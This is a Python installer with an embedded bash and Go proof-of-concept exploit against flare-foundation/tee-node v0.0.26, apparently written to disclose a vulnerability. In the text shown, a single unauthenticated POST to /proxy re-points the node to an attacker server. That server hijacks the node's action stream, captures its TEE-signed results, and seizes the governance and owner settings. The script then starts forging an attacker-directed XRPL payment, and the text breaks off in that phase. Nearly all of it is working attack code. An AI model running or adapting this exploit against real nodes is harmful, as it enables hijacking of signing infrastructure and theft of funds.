#!/usr/bin/env python3
# tee-node PoC installer (rev 5) - computed-indentation compose generation,
# post-generation validation, helper-order fix, color typo fix.
import hashlib, os, re, sys

POC = r"""#!/usr/bin/env bash
# ============================================================================
# ONE-SHOT PoC rev 5 - flare-foundation/tee-node @ v0.0.26
# rev 5: compose generated with COMPUTED indentation (printf) + validated
#        immediately (docker compose config -q); helper definitions moved
#        before first use; color escape typo fixed.
# Usage: ./poc.sh [--quick] [--keep] [--hostnet]
# Env:   TEE_NODE_SRC=<path>  use a local clone instead of fetching v0.0.26
# Localnet only. Run solely against instances you own.
# ============================================================================
set -uo pipefail
cd "$(dirname "$0")"

TAG="v0.0.26"
REPO_URL="https://github.com/flare-foundation/tee-node.git"
NODE_IMAGE="ghcr.io/flare-foundation/tee-node:$TAG"
CHAIN_ID=31337
GOVADDR="0x000000000000000000000000000000000000dEaD"

QUICK=0; KEEP=0; HOSTNET=0
for a in "$@"; do
  case "$a" in
    --quick)   QUICK=1;;
    --keep)    KEEP=1;;
    --hostnet) HOSTNET=1;;
  esac
done

# ---- network targets (mode-dependent) --------------------------------------
if [ "$HOSTNET" = "1" ]; then
  PROXY_TARGET="http://127.0.0.1:8080"
  LEGIT_URL="http://127.0.0.1:8080"
  ATTACKER_URL="http://127.0.0.1:9000"
  NODE_URL="http://127.0.0.1:5500"
else
  PROXY_TARGET="http://legit-proxy:8080"
  LEGIT_URL="http://legit-proxy:8080"
  ATTACKER_URL="http://attacker:9000"
  NODE_URL="http://tee-node:5500"
fi

TS=$(date +%Y%m%d-%H%M%S)
WS="$PWD/.poc-ws-$TS"; mkdir -p "$WS"
EV="$PWD/poc-evidence-$TS"; mkdir -p "$EV/forger"
FAILED=0; FORGER_BUILT=0; LEGIT_TEEID=""

# ---- output helpers (defined BEFORE first use) ------------------------------
C='\033[1;34m'; G='\033[1;32m'; R='\033[1;31m'; Y='\033[1;33m'; N='\033[0m'
phase(){ echo -e "\n${C}======== $1 ========${N}"; }
ok(){   local l="[PASS] $1"; echo -e "${G}${l}${N}"; echo "$l" >> "$EV/SUMMARY.txt"; }
info(){ echo -e "${Y}[INFO]${N} $1"; }
fail(){ local l="[FAIL] $1"; echo -e "${R}${l}${N}"; echo "$l" >> "$EV/SUMMARY.txt"; FAILED=1; }

cleanup(){
  if [ "$KEEP" = "1" ]; then
    echo "KEEP=1 - containers left running; workspace: $WS"
  else
    docker compose -f "$WS/docker-compose.yml" down -v >/dev/null 2>&1
    rm -rf "$WS"
  fi
}
trap cleanup EXIT

dc(){ docker compose -f "$WS/docker-compose.yml" "$@"; }
nc(){ dc exec -T attacker curl -sS --noproxy '*' --max-time 5 "$@"; }
jqf(){ dc exec -T attacker jq -r "$@"; }

forge(){
  local cap=""
  [ -n "${CAPTURE:-}" ] && cap="/ws/$(basename "$CAPTURE")"
  docker run --rm -v "$WS:/ws" \
    -e POC_FORGER_CMD="$1" -e POC_FORGER_OUT=/ws/out.json -e POC_FORGER_KEYS=/ws/keys \
    -e POC_FORGER_TEEID="${TEEID:-}" -e POC_FORGER_CAPTURE="$cap" \
    -e POC_FORGER_GOVADDR="$GOVADDR" \
    golang:1.25 /ws/forger.test -test.run TestPocForger -test.count=1 -test.v
}
push_action(){ nc -X POST $ATTACKER_URL/actions -H 'Content-Type: application/json' --data-binary @- < "$WS/out.json" >/dev/null; }
push_legit(){  nc -X POST $LEGIT_URL/actions -H 'Content-Type: application/json' --data-binary @- < "$WS/out.json" >/dev/null; }
wait_count(){
  local url=$1 prev=$2 field=$3 to=${4:-20} i c
  for i in $(seq 1 $((to*2))); do
    c=$(nc "$url/stats" | jqf ".$field" 2>/dev/null) || c=0
    [ "${c:-0}" -gt "$prev" ] && { echo "$c"; return 0; }
    sleep 0.5
  done; echo "$prev"; return 1; }
body_at(){ nc $ATTACKER_URL/received | jqf ".[$1]"; }

# ---------------------------------------------------------------- preflight
command -v git >/dev/null || { echo "git required"; exit 1; }
docker compose version >/dev/null 2>&1 || { echo "docker compose v2 required"; exit 1; }
docker compose -p tee-node-poc down -v >/dev/null 2>&1 || true

if [ "$HOSTNET" = "1" ]; then
  info "host-network mode: services share one netns (127.0.0.1)"
  if command -v ss >/dev/null 2>&1 || command -v netstat >/dev/null 2>&1; then
    for p in 5500 8080 9000; do
      if (ss -ltn 2>/dev/null || netstat -ltn 2>/dev/null) | grep -qE "[:.]$p[[:space:]]"; then
        echo "port $p already in use - free it before --hostnet mode"; exit 1
      fi
    done
  else
    info "ss/netstat not found - port preflight skipped"
  fi
fi

echo "workspace: $WS"; echo "evidence:  $EV"
echo "netmode:   $([ "$HOSTNET" = "1" ] && echo host || echo bridge)"

# ---------------------------------------------------------------- repo ------
if [ -n "${TEE_NODE_SRC:-}" ] && [ -d "${TEE_NODE_SRC:-}" ]; then
  cp -r "$TEE_NODE_SRC" "$WS/repo"
else
  git clone --depth 1 --branch "$TAG" "$REPO_URL" "$WS/repo" || { echo "clone failed"; exit 1; }
fi
{ echo "target: flare-foundation/tee-node"; echo "tag: $TAG";
  echo "commit: $(git -C "$WS/repo" rev-parse HEAD 2>/dev/null)"; } > "$EV/target-version.txt"

# ------------------------------------------- embedded: forger (injected) ---
mkdir -p "$WS/repo/pocforger"
cat > "$WS/repo/pocforger/forger_test.go" <<'EOF'
package pocforger

import (
    "crypto/ecdsa"
    "encoding/hex"
    "encoding/json"
    "fmt"
    "math/big"
    "os"
    "path/filepath"
    "strings"
    "testing"
    "time"

    "github.com/ethereum/go-ethereum/accounts/abi"
    "github.com/ethereum/go-ethereum/common"
    "github.com/ethereum/go-ethereum/crypto"
    csigning "github.com/flare-foundation/go-flare-common/pkg/signing"
    "github.com/flare-foundation/go-flare-common/pkg/tee/op"
    "github.com/flare-foundation/go-flare-common/pkg/tee/structs/payments"
    "github.com/flare-foundation/go-flare-common/pkg/tee/structs/wallet"
    "github.com/flare-foundation/go-flare-common/pkg/xrpl/signing"
    "github.com/flare-foundation/go-flare-common/pkg/xrpl/signing/signer"
    "github.com/flare-foundation/tee-node/internal/testutils"
    "github.com/flare-foundation/tee-node/pkg/types"
    wallets "github.com/flare-foundation/tee-node/pkg/wallets"
    "github.com/flare-foundation/tee-node/pkg/utils"
    "github.com/stretchr/testify/require"
)

const (
    pocChainID = uint64(31337)
    pocEpoch   = uint32(2)
    numVoters  = 5
    numAdmins  = 3
    numCosigns = 3
)

var (
    walletID = common.HexToHash("0xabcdef")
    keyID    = uint64(1)
)

func keys(t *testing.T, dir, prefix string, n int) []*ecdsa.PrivateKey {
    t.Helper()
    out := make([]*ecdsa.PrivateKey, n)
    for i := range out {
        p := filepath.Join(dir, fmt.Sprintf("%s_%d.hex", prefix, i))
        if b, err := os.ReadFile(p); err == nil {
            bn, err := hex.DecodeString(strings.TrimSpace(string(b)))
            require.NoError(t, err)
            k, err := crypto.ToECDSA(bn)
            require.NoError(t, err)
            out[i] = k
            continue
        }
        k, err := crypto.GenerateKey()
        require.NoError(t, err)
        require.NoError(t, os.MkdirAll(dir, 0o755))
        require.NoError(t, os.WriteFile(p, []byte(hex.EncodeToString(crypto.FromECDSA(k))), 0o600))
        out[i] = k
    }
    return out
}

func emit(t *testing.T, queue string, action any, out string) {
    t.Helper()
    b, err := json.Marshal(map[string]any{"queue": queue, "action": action})
    require.NoError(t, err)
    require.NoError(t, os.WriteFile(out, b, 0o644))
}

func actionResultSignHash(t *testing.T, ar types.ActionResult) []byte {
    t.Helper()
    h, err := csigning.NewPayload(csigning.TEEActionResult, pocChainID, common.BytesToHash(ar.Hash())).Hash()
    require.NoError(t, err)
    return h[:]
}

func TestPocForger(t *testing.T) {
    cmd := os.Getenv("POC_FORGER_CMD")
    out := os.Getenv("POC_FORGER_OUT")
    keysDir := os.Getenv("POC_FORGER_KEYS")
    capture := os.Getenv("POC_FORGER_CAPTURE")
    teeIDHex := os.Getenv("POC_FORGER_TEEID")
    require.NotEmpty(t, cmd, "POC_FORGER_CMD required")

    teeID := common.Address{}
    if teeIDHex != "" {
        teeID = common.HexToAddress(teeIDHex)
    }

    switch cmd {
    case "tee-info":
        req := &types.TeeInfoRequest{Challenge: common.HexToHash("0x" + strings.Repeat("ab", 32))}
        emit(t, "direct", testutils.BuildMockDirectAction(t, op.Get, op.TEEInfo, req), out)

    case "key-info":
        emit(t, "direct", testutils.BuildMockDirectAction(t, op.Get, op.KeyInfo, []any{}), out)

    case "init-policy":
        voters := keys(t, keysDir, "voter", numVoters)
        addrs := make([]common.Address, len(voters))
        pubKeys := make([]types.PublicKey, len(voters))
        for i, k := range voters {
            addrs[i] = crypto.PubkeyToAddress(k.PublicKey)
            pubKeys[i] = types.PubKeyToStruct(&k.PublicKey)
        }
        policy := testutils.GenerateRandomPolicyData(t, pocEpoch, addrs, int64(918273))
        req := &types.InitializePolicyRequest{InitialPolicyBytes: policy.RawBytes(), PublicKeys: pubKeys}
        emit(t, "direct", testutils.BuildMockDirectAction(t, op.Policy, op.InitializePolicy, req), out)

    case "key-generate":
        require.NotEmpty(t, teeIDHex, "POC_FORGER_TEEID required")
        voters := keys(t, keysDir, "voter", numVoters)
        admins := keys(t, keysDir, "admin", numAdmins)
        cos := keys(t, keysDir, "cosigner", numCosigns)

        adminPubs := make([]wallet.PublicKey, len(admins))
        for i, k := range admins {
            pk := types.PubKeyToStruct(&k.PublicKey)
            adminPubs[i] = wallet.PublicKey{X: pk.X, Y: pk.Y}
        }
        cosAddrs := make([]common.Address, len(cos))
        for i, k := range cos {
            cosAddrs[i] = crypto.PubkeyToAddress(k.PublicKey)
        }

        msg := wallet.IWalletKeyManagerKeyGenerate{
            TeeId: teeID, WalletId: walletID, KeyId: keyID,
            KeyType: wallets.XRPType, SigningAlgo: wallets.XRPSignAlgo,
            ConfigConstants: wallet.IWalletKeyManagerKeyConfigConstants{
                AdminsPublicKeys:   adminPubs,
                AdminsThreshold:    uint64(len(adminPubs)),
                Cosigners:          cosAddrs,
                CosignersThreshold: uint64(len(cosAddrs)),
            },
        }
        enc, err := abi.Arguments{wallet.MessageArguments[op.KeyGenerate]}.Pack(msg)
        require.NoError(t, err)
        action := testutils.BuildMockInstructionAction(t, op.Wallet, op.KeyGenerate, enc,
            voters, pocChainID, teeID, pocEpoch, nil, nil, nil, 0,
            types.Threshold, uint64(time.Now().Unix()))
        emit(t, "main", action, out)

    case "xrp-pay":
        require.NotEmpty(t, teeIDHex, "POC_FORGER_TEEID required")
        voters := keys(t, keysDir, "voter", numVoters)
        cos := keys(t, keysDir, "cosigner", numCosigns)
        cosAddrs := make([]common.Address, len(cos))
        for i, k := range cos {
            cosAddrs[i] = crypto.PubkeyToAddress(k.PublicKey)
        }
        signingKeys := append(append([]*ecdsa.PrivateKey{}, voters...), cos...)

        msg := payments.ITeePaymentsPaymentInstructionMessage{
            WalletId:         walletID,
            TeeIdKeyIdPairs:  []payments.TeeIdKeyIdPair{{TeeId: teeID, KeyId: keyID}},
            SenderAddress:    "ravbaTwRkNqecy9Zdw8zwrw4uK5awjqhFd",
            RecipientAddress: "rrrrrrrrrrrrrrrrrNAMEtxvNvQ",
            Amount:           big.NewInt(1000000000),
            MaxFee:           big.NewInt(10),
            FeeSchedule:      []byte{0x27, 0x10, 0x00, 0x01},
            PaymentReference: [32]byte{},
            Nonce:            0,
        }
        enc, err := abi.Arguments{payments.MessageArguments[op.Pay]}.Pack(msg)
        require.NoError(t, err)
        action := testutils.BuildMockInstructionAction(t, op.XRP, op.Pay, enc,
            signingKeys, pocChainID, teeID, pocEpoch, []byte{}, nil,
            cosAddrs, uint64(len(cosAddrs)), types.Threshold, uint64(time.Now().Unix()))
        emit(t, "main", action, out)

    case "extract-tee-id":
        b, err := os.ReadFile(capture)
        require.NoError(t, err)
        var resp types.ActionResponse
        require.NoError(t, json.Unmarshal(b, &resp))
        var tir types.TeeInfoResponse
        require.NoError(t, json.Unmarshal(resp.Result.Data, &tir))
        pub, err := types.ParsePubKey(tir.TeeInfo.PublicKey)
        require.NoError(t, err)
        id := crypto.PubkeyToAddress(*pub)
        require.NoError(t, utils.VerifySignature(actionResultSignHash(t, resp.Result), resp.Signature, id),
            "response not genuinely signed by the node key")
        require.NoError(t, os.WriteFile(out, []byte(id.Hex()), 0o644))

    case "verify-xrp":
        b, err := os.ReadFile(capture)
        require.NoError(t, err)
        var resp types.ActionResponse
        require.NoError(t, json.Unmarshal(b, &resp))
        require.Equal(t, uint8(1), resp.Result.Status, "expected the final signed response")
        require.NoError(t, utils.VerifySignature(actionResultSignHash(t, resp.Result), resp.Signature,
            common.HexToAddress(teeIDHex)), "ActionResponse signature by TEE key INVALID")
        var txs types.XRPSignResponse
        require.NoError(t, json.Unmarshal(resp.Result.Data, &txs))
        require.NotEmpty(t, txs, "no signed transactions in result")
        for i, tx := range txs {
            signersAny, ok := tx["Signers"].([]any)
            require.True(t, ok, "tx[%d] missing Signers", i)
            require.NotEmpty(t, signersAny, "tx[%d] has no signers", i)
            for j, sAny := range signersAny {
                s, err := signer.Parse(sAny.(map[string]any))
                require.NoError(t, err, "tx[%d] signer[%d] parse", i, j)
                valid, err := signing.ValidateMultiSig(tx, s)
                require.NoError(t, err, "tx[%d] signer[%d]", i, j)
                require.True(t, valid, "tx[%d] signer[%d] XRPL multisig INVALID", i, j)
            }
        }
        t.Logf("VERIFIED: TEE-signed result carrying %d validly multi-signed XRPL transaction(s)", len(txs))

    case "governance-hash":
        h, err := types.GovernanceHash([]common.Address{common.HexToAddress(os.Getenv("POC_FORGER_GOVADDR"))}, 1)
        require.NoError(t, err)
        require.NoError(t, os.WriteFile(out, []byte(h.Hex()), 0o644))
    }
}
EOF

# ------------------------------------------------- embedded: proxies -------
mkdir -p "$WS/legit" "$WS/attacker"

cat > "$WS/legit/server.py" <<'EOF'
import json, threading, time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
stats = {"polls": 0, "results": 0}
PENDING = {"main": [], "direct": [], "backup": []}
RECEIVED = []
lock = threading.Lock()
class H(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"
    def log_message(self, *a): pass
    def _json(self, code, obj):
        b = json.dumps(obj).encode()
        self.send_response(code); self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(b))); self.end_headers(); self.wfile.write(b)
    def do_POST(self):
        n = int(self.headers.get("Content-Length") or 0)
        body = self.rfile.read(n) if n else b""
        p, ts = self.path, time.strftime("%H:%M:%S")
        if p == "/actions":
            req = json.loads(body); q = req.get("queue", "direct")
            with lock: PENDING.setdefault(q, []).append(req["action"])
            print(f"[legit-proxy {ts}] queued action -> /queue/{q}", flush=True)
            return self._json(200, {})
        print(f"[legit-proxy {ts}] POST {p}", flush=True)
        if p.startswith("/queue/"):
            q = p.rsplit("/", 1)[-1]
            with lock:
                stats["polls"] += 1
                pend = PENDING.get(q, [])
                a = pend.pop(0) if pend else None
            if a is not None:
                print(f"[legit-proxy {ts}] >>> SERVING ACTION on {p}", flush=True)
                return self._json(200, a)
            return self._json(200, {})
        if p == "/result":
            with lock:
                stats["results"] += 1
                RECEIVED.append(body.decode(errors="replace"))
            print(f"[legit-proxy {ts}] result received", flush=True)
            return self._json(200, {})
        return self._json(404, {})
    def do_GET(self):
        if self.path == "/stats":
            with lock: return self._json(200, stats)
        if self.path == "/received":
            with lock: return self._json(200, RECEIVED)
        return self._json(404, {})
ThreadingHTTPServer(("0.0.0.0", 8080), H).serve_forever()
EOF

cat > "$WS/attacker/server.py" <<'EOF'
import json, re, threading, time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
MODE = {"m": "observe"}
PENDING = {"main": [], "direct": [], "backup": []}
POLLS, RECEIVED = [], []
lock = threading.Lock()
SIG_RE = re.compile(r'0x[0-9a-fA-F]{130}|"[Ss]ignature"\s*:')
class H(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"
    def log_message(self, *a): pass
    def _json(self, code, obj):
        b = json.dumps(obj).encode()
        self.send_response(code); self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(b))); self.end_headers(); self.wfile.write(b)
    def do_POST(self):
        n = int(self.headers.get("Content-Length") or 0)
        body = self.rfile.read(n) if n else b""
        p, ts = self.path, time.strftime("%H:%M:%S")
        if p == "/mode":
            MODE["m"] = json.loads(body)["mode"]
            print(f"[attacker {ts}] mode -> {MODE['m']}", flush=True)
            return self._json(200, {"mode": MODE["m"]})
        if p == "/actions":
            req = json.loads(body); q = req.get("queue", "direct")
            with lock: PENDING.setdefault(q, []).append(req["action"])
            print(f"[attacker {ts}] queued forged action -> /queue/{q}", flush=True)
            return self._json(200, {})
        if p.startswith("/queue/"):
            q = p.rsplit("/", 1)[-1]
            with lock: POLLS.append(p)
            print(f"[attacker {ts}] HIJACKED POLL {p}", flush=True)
            if MODE["m"] == "force-errors":
                return self._json(404, {"error": "not found"})
            with lock: pend = PENDING.get(q, [])
            if pend:
                a = pend.pop(0)
                print(f"[attacker {ts}] >>> SERVING FORGED ACTION on {p}", flush=True)
                return self._json(200, a)
            return self._json(200, {})
        if p == "/result":
            with lock: RECEIVED.append(body.decode(errors="replace"))
            print(f"[attacker {ts}] *** TEE RESULT CAPTURED: {body[:180]}", flush=True)
            return self._json(200, {})
        return self._json(404, {})
    def do_GET(self):
        if self.path == "/stats":
            with lock:
                signed = sum(1 for r in RECEIVED if SIG_RE.search(r))
                return self._json(200, {"polls": len(POLLS), "results": len(RECEIVED),
                                        "signed_results": signed})
        if self.path == "/received":
            with lock: return self._json(200, RECEIVED)
        return self._json(404, {})
ThreadingHTTPServer(("0.0.0.0", 9000), H).serve_forever()
EOF

cat > "$WS/legit/Dockerfile"  <<'EOF'
FROM python:3.12-slim
COPY server.py /srv/server.py
CMD ["python3", "/srv/server.py"]
EOF
cat > "$WS/attacker/Dockerfile" <<'EOF'
FROM python:3.12-slim
RUN apt-get update && apt-get install -y --no-install-recommends curl jq \
 && rm -rf /var/lib/apt/lists/*
COPY server.py /srv/server.py
CMD ["python3", "/srv/server.py"]
EOF

# ------------------------------------------------- compose -----------------
# rev 5: ALL indentation is COMPUTED (printf) - immune to whitespace slips -
# and the file is validated immediately after generation.
write_compose(){ # $1=image|build  $2=host|bridge
  local i2 i4 i6 i8 top netline footer
  i2=$(printf '%2s' ''); i4=$(printf '%4s' ''); i6=$(printf '%6s' ''); i8=$(printf '%8s' '')
  if [ "$1" = "image" ]; then
    top="${i4}image: $NODE_IMAGE"
  else
    top="${i4}build:
 ${i6}context: ./repo
 ${i6}args:
 ${i8}SOURCE_DATE_EPOCH: \"$SDE\""
  fi
  if [ "$2" = "host" ]; then
    netline="${i4}network_mode: host"
    footer=""
  else
    netline="${i4}networks: [pocnet]"
    footer="
networks:
 ${i2}pocnet:
 ${i4}driver: bridge"
  fi
  {
    echo "name: tee-node-poc"
    echo "services:"
    echo "${i2}tee-node:"
    echo "$top"
    echo "${i4}environment:"
    echo "${i6}MODE: \"1\""
    echo "${i6}LOG_LEVEL: \"INFO\""
    echo "${i6}PROXY_URL: $PROXY_TARGET"
    echo "${i6}CHAIN_ID: \"$CHAIN_ID\""
    echo "${i6}HTTP_PROXY: \"\""
    echo "${i6}HTTPS_PROXY: \"\""
    echo "${i6}http_proxy: \"\""
    echo "${i6}https_proxy: \"\""
    echo "${i6}NO_PROXY: \"*\""
    echo "${i6}no_proxy: \"*\""
    echo "$netline"
    echo "${i2}legit-proxy:"
    echo "${i4}build: ./legit"
    echo "$netline"
    echo "${i2}attacker:"
    echo "${i4}build: ./attacker"
    echo "$netline$footer"
  } > "$WS/docker-compose.yml"
  if ! docker compose -f "$WS/docker-compose.yml" config -q >/dev/null 2>"$WS/compose-check.err"; then
    echo "FATAL: generated docker-compose.yml failed validation:"
    cat "$WS/compose-check.err"
    echo "---- generated file (cat -A: ^I = tab, \$ = line end) ----"
    cat -A "$WS/docker-compose.yml"
    exit 1
  fi
  info "compose file generated and validated ($1 / $2)"
}

SDE=$(git -C "$WS/repo" log -1 --format=%ct)
if docker pull "$NODE_IMAGE" >/dev/null 2>&1; then
  info "using published image $NODE_IMAGE"; SRCMODE=image
else
  info "published image unavailable - building from source at $TAG"; SRCMODE=build
fi
[ "$HOSTNET" = "1" ] && NETMODE=host || NETMODE=bridge
write_compose "$SRCMODE" "$NETMODE"

# ------------------------------------------- background forger build -------
FORGER_PID=""
if [ "$QUICK" != "1" ]; then
  info "building forger in background (first run 2-4 min; logs: $EV/forger-build.log)"
  ( docker run --rm -v "$WS:/ws" -v "$WS/repo:/repo" -v poc-gomodcache:/go/pkg/mod \
      -v poc-gocache:/root/.cache/go-build -w /repo -e GOFLAGS=-mod=mod \
      golang:1.25 go test -c ./pocforger/ -o /ws/forger.test ) > "$EV/forger-build.log" 2>&1 &
  FORGER_PID=$!
fi

# ============================================================ PHASE 0a =====
phase "PHASE 0a - Build & start | NORMAL FLOW, idle (BEFORE)"
dc up -d --build

# ========================================================== SELF-TEST ======
phase "SELF-TEST - network sanity"
sleep 3
if ! dc exec -T attacker curl -sS --noproxy '*' -m 5 \
       "$LEGIT_URL/stats" >/dev/null 2>"$WS/selftest.err"; then
  fail "network self-test failed: $(cat "$WS/selftest.err")"
  echo ""
  echo "---- diagnostics (collected for you) ----"
  echo "[compose ps]"; dc ps 2>&1 | sed 's/^/  /'
  echo "[proxy env inside attacker container]"
  dc exec -T attacker sh -c 'env | grep -i proxy' 2>&1 | sed 's/^/  /' || true
  echo "[host docker daemon proxy config (userland lines excluded)]"
  docker info 2>/dev/null | grep -i proxy | grep -viE 'userland|userns' | sed 's/^/  /' || echo "  (none)"
  if [ "$HOSTNET" != "1" ]; then
    echo "[DNS: legit-proxy from attacker]"
    dc exec -T attacker sh -c 'getent hosts legit-proxy' 2>&1 | sed 's/^/  /' || true
  fi
  echo ""
  if [ "$HOSTNET" = "1" ]; then
    echo "hostnet mode: a failure here means a port conflict or a crashed server:"
    echo "  docker compose -f $WS/docker-compose.yml logs legit-proxy"
  else
    echo "bridge mode failure: see diag guidance or retry with --hostnet"
  fi
  exit 1
fi
ok "attacker -> legit-proxy reachable (network mode: $NETMODE)"
dc exec -T attacker curl -sS --noproxy '*' -m 5 -o /dev/null "$ATTACKER_URL/stats" 2>/dev/null \
  && ok "attacker control plane reachable"

echo "waiting for the node to poll its deploy-time-configured proxy..."
POLLS=0
for i in $(seq 1 120); do
  POLLS=$(nc $LEGIT_URL/stats 2>/dev/null | jqf .polls 2>/dev/null) || POLLS=0
  [ "${POLLS:-0}" -gt 5 ] && break
  sleep 1
done
if [ "${POLLS:-0}" -gt 5 ]; then
  ok "Normal idle flow: node polling legitimate proxy (${POLLS}x)"
else
  fail "node never polled the legit proxy - node logs follow:"
  dc logs tee-node 2>&1 | tail -n 20
fi
A0=$(nc $ATTACKER_URL/stats | jqf .polls 2>/dev/null) || A0=0
[ "${A0:-0}" -eq 0 ] && ok "Attacker blind before the attack (0 polls)" || fail "pre-attack visibility"
nc $LEGIT_URL/stats > "$EV/stats-before.json"

# ============================================================ PHASE 0b =====
phase "PHASE 0b - NORMAL FLOW, one legitimate action (BEFORE, full mode)"
if [ "$QUICK" = "1" ]; then
  info "skipped (--quick)"
elif [ -n "$FORGER_PID" ]; then
  info "waiting for forger build to finish..."
  if wait "$FORGER_PID" && [ -f "$WS/forger.test" ]; then
    FORGER_BUILT=1
    if forge tee-info >/dev/null && push_legit; then
      LR=$(nc $LEGIT_URL/stats | jqf .results 2>/dev/null) || LR=0
      if wait_count "$LEGIT_URL" "$LR" results 20 >/dev/null; then
        nc $LEGIT_URL/received | jqf '.[0]' > "$WS/teeinfo-legit.json"
        cp "$WS/teeinfo-legit.json" "$EV/00-normal-flow-teeinfo-response.json"
        if CAPTURE="$WS/teeinfo-legit.json" forge extract-tee-id >/dev/null; then
          LEGIT_TEEID=$(cat "$WS/out.json")
          ok "NORMAL ACTION FLOW: node processed a legitimate direct action and returned a TEE-SIGNED result to the legitimate proxy (node identity: $LEGIT_TEEID)"
        else
          ok "NORMAL ACTION FLOW: legitimate action processed, result delivered to the legit proxy"
        fi
      else
        fail "legitimate action produced no result at the legit proxy"
      fi
    fi
  else
    info "forger build failed (see $EV/forger-build.log) - Phase 0b & 6 skipped"
  fi
fi

# ============================================================ PHASE 1 ======
phase "PHASE 1 - Attack surface (reconnaissance)"
CODE=$(nc -o /dev/null -w '%{http_code}' $NODE_URL/ 2>/dev/null)
if [ "${CODE:-000}" != "000" ]; then
  if [ "$HOSTNET" = "1" ]; then
    ok ":5500 reachable from an unrelated process (hostnet mode; all-interfaces bind live. Loopback contrast is code-level here: SignHost is hardcoded 127.0.0.1)"
  else
    ok ":5500 reachable CROSS-CONTAINER (all-interfaces bind; a SignHost-style loopback binding would refuse)"
  fi
else
  fail ":5500 unreachable"
fi
CODE8=$(nc -o /dev/null -w '%{http_code}' http://127.0.0.1:8888/ 2>/dev/null)
[ "${CODE8:-000}" = "000" ] \
  && info ":8888 refuses (sign API loopback-fixed by design - the contrast :5500 violates)" \
  || info ":8888 answered ($CODE8)"

# ============================================================ PHASE 2 ======
phase "PHASE 2 - THE ATTACK: one unauthenticated request"
{
  echo "\$ POST $NODE_URL/proxy  {\"url\":\"$ATTACKER_URL\"}"
  echo "(no auth headers of any kind; PROXY_URL was provisioned at deploy time via env)"
  dc exec -T attacker curl -sS --noproxy '*' -i --max-time 5 -X POST "$NODE_URL/proxy" \
    -H 'Content-Type: application/json' -d "{\"url\":\"$ATTACKER_URL\"}"
} | tee "$EV/01-attack-request.txt"
grep -q "200" "$EV/01-attack-request.txt" \
  && ok "Trust anchor re-pointed with a single unauthenticated POST" \
  || fail "attack request rejected"

# ============================================================ PHASE 3 ======
phase "PHASE 3 - AFTERMATH: suppression + hijack"
P1=$(nc $LEGIT_URL/stats | jqf .polls); sleep 8
P2=$(nc $LEGIT_URL/stats | jqf .polls)
[ "$P1" = "$P2" ] && ok "Legit proxy FROZEN at $P1 polls (silent total suppression - fleet loses the node)" \
                 || fail "legit proxy still polled ($P1 -> $P2)"
AP=$(nc $ATTACKER_URL/stats | jqf .polls)
[ "${AP:-0}" -ge 6 ] && ok "Attacker now owns the node's action stream (${AP} polls)" || fail "no hijack"
info "per-request hijack evidence: 'HIJACKED POLL' lines in $EV/attacker.log (saved at summary)"

# ============================================================ PHASE 4 ======
phase "PHASE 4 - TEE-SIGNED result exfiltration + the set-once contrast"
nc -X POST $ATTACKER_URL/mode -H 'Content-Type: application/json' -d '{"mode":"force-errors"}' >/dev/null
sleep 8
SG=$(nc $ATTACKER_URL/stats | jqf .signed_results)
[ "${SG:-0}" -ge 3 ] && ok "TEE-SIGNED results exfiltrated to attacker: ${SG} (ECDSA by the node key)" \
                     || fail "no signed results (${SG:-0})"
nc $ATTACKER_URL/received | jqf '.[-1]' > "$EV/02-sample-signed-result.json"
echo "- sample captured ActionResponse:"; head -c 300 "$EV/02-sample-signed-result.json"; echo
dc logs tee-node 2>/dev/null | grep -m2 "error getting action" \
  && info "node error logs confirm failing fetches against the hijacked endpoint" || true
CODE=$(nc -o /dev/null -w '%{http_code}' -X POST "$NODE_URL/chain-id" \
  -H 'Content-Type: application/json' -d "{\"chainId\":$CHAIN_ID}")
[ "$CODE" = "403" ] && ok "CONTRAST: /chain-id (env-provisioned) REFUSES the attacker ($CODE) - while /proxy, equally env-provisioned, fell to one POST: the documented mitigation holds ONLY for set-once endpoints" \
                    || info "/chain-id answered $CODE (expected 403 when env-provisioned)"
nc -X POST $ATTACKER_URL/mode -H 'Content-Type: application/json' -d '{"mode":"observe"}' >/dev/null

# ============================================================ PHASE 5 ======
phase "PHASE 5 - Persistence & the set-once asymmetry"
CODE=$(nc -o /dev/null -w '%{http_code}' -X POST "$NODE_URL/proxy" \
  -H 'Content-Type: application/json' -d "{\"url\":\"$ATTACKER_URL\"}")
[ "$CODE" = "200" ] && ok "/proxy re-set AGAIN ($CODE): NO set-once - endlessly mutable" \
                    || fail "unexpected ($CODE)"
CODE=$(nc -o /dev/null -w '%{http_code}' -X POST "$NODE_URL/governance" \
  -H 'Content-Type: application/json' -d "{\"signers\":[\"$GOVADDR\"],\"threshold\":1}")
[ "$CODE" = "200" ] && ok "GOVERNANCE captured (machine-path authorization root -> attacker)" || fail "governance ($CODE)"
CODE2=$(nc -o /dev/null -w '%{http_code}' -X POST "$NODE_URL/governance" \
  -H 'Content-Type: application/json' -d "{\"signers\":[\"$GOVADDR\"],\"threshold\":1}")
[ "$CODE2" = "403" ] && ok "Contrast: /governance IS set-once (2nd call -> 403); /proxy alone is endlessly mutable" \
                    || info "2nd governance call: $CODE2"
CODE=$(nc -o /dev/null -w '%{http_code}' -X POST "$NODE_URL/initial-owner" \
  -H 'Content-Type: application/json' -d "{\"owner\":\"$GOVADDR\"}")
[ "$CODE" = "200" ] && ok "INITIAL OWNER captured (flows into attested MachineData)" || fail "owner ($CODE)"

# ============================================================ PHASE 6 ======
phase "PHASE 6 - Deep impact: policy capture -> TEE signs attacker-directed XRPL payment"
if [ "$FORGER_BUILT" != "1" ]; then
  info "skipped (forger unavailable or --quick) - Phases 0a-5 remain fully valid"
else
  while :; do
    R0=$(nc $ATTACKER_URL/stats | jqf .results)
    if ! forge tee-info >/dev/null || ! push_action; then fail "D1: forge/push failed"; break; fi
    if ! wait_count "$ATTACKER_URL" "$R0" results 20 >/dev/null; then fail "D1: no result for TEEInfo"; break; fi
    CAPTURE="$WS/teeinfo-attacker.json"; body_at "$R0" > "$CAPTURE"
    cp "$CAPTURE" "$EV/forger/01-teeinfo-response.json"
    if ! CAPTURE="$WS/teeinfo-attacker.json" forge extract-tee-id >/dev/null; then fail "D1: extract-tee-id failed"; break; fi
    TEEID=$(cat "$WS/out.json")
    ok "D1 - node identity via zero-auth direct action: $TEEID (TEE signature on the response verified)"
